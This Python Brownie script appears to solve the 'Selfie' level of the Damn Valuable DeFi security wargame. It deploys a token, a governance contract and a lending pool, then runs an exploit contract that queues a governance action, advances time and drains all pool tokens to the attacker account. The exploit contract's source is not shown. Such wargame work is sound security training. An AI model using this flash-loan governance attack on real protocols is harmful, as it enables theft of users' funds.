from brownie import DamnValuableTokenSnapshot, SimpleGovernance, SelfiePool, selfie_Exploit, accounts, chain


TOKEN_INITIAL_SUPPLY = 2000000
TOKENS_IN_POOL = 1500000


def deploy():
    deployer, attacker = accounts[:2]

    token = DamnValuableTokenSnapshot.deploy(
        TOKEN_INITIAL_SUPPLY, {'from': deployer})
    governance = SimpleGovernance.deploy(token, {'from': deployer})
    pool = SelfiePool.deploy(token, governance, {'from': deployer})

    token.transfer(pool, TOKENS_IN_POOL, {'from': deployer})

    assert token.balanceOf(pool) == TOKENS_IN_POOL

    return deployer, attacker, token, pool, governance


def exploit(attacker, governance, pool):
    exploit = selfie_Exploit.deploy(pool, governance, {'from': attacker})
    exploit.setExploit(TOKENS_IN_POOL, {'from': attacker})
    chain.sleep(60 * 60 * 24 * 2)
    exploit.executeExploit()


def after(attacker, token, pool):

    assert token.balanceOf(attacker) == TOKENS_IN_POOL
    assert token.balanceOf(pool) == 0


def main():
    deployer, attacker, token, pool, governance = deploy()

    exploit(attacker, governance,  pool)

    after(attacker, token, pool)
